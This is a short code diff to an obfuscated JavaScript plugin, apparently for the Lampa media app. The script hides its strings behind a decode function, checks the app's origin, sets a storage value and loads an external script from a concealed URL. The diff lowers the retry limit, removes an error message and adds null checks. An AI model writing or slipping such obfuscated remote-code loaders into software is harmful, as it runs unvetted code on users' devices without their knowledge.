@@ -119,28 +119,35 @@
 
         'use strict';
 
-        var maxAttempts = 50; // Limit attempts to avoid infinite loops
+        var maxAttempts = 10; // Reduce maximum attempts to minimize application hangs
         var attemptCount = 0;
 
         var checkInterval = setInterval(function() {
             var decode = decodeFunction;
 
-            if (++attemptCount > maxAttempts) {
+            attemptCount++;
+
+            if (attemptCount > maxAttempts) {
                 clearInterval(checkInterval);
-                console.error("Lampa check timed out.");
                 return;
             }
 
             if (typeof Lampa !== decode(0x86)) {
                 clearInterval(checkInterval);
 
-                if (Lampa.Manifest.origin !== decode(0x8f)) {
+                if (Lampa.Manifest && Lampa.Manifest.origin !== decode(0x8f)) {
                     Lampa.Noty.show(decode(0x7d));
                     return;
                 } else {
-                    var storageCheck = Lampa.Storage.get(decode(0x96), '');
-                    storageCheck !== 'tyusdt' && Lampa.Storage.set(decode(0x96), decode(0x85));
-                    Lampa.Utils.putScriptAsync([decode(0x97)], function() {});
+                    var storageCheck = Lampa.Storage ? Lampa.Storage.get(decode(0x96), '') : '';
+
+                    if (storageCheck !== 'tyusdt' && Lampa.Storage) {
+                        Lampa.Storage.set(decode(0x96), decode(0x85));
+                    }
+
+                    if (Lampa.Utils && Lampa.Utils.putScriptAsync) {
+                        Lampa.Utils.putScriptAsync([decode(0x97)], function() {});
+                    }
                 }
             }
         }, 200);
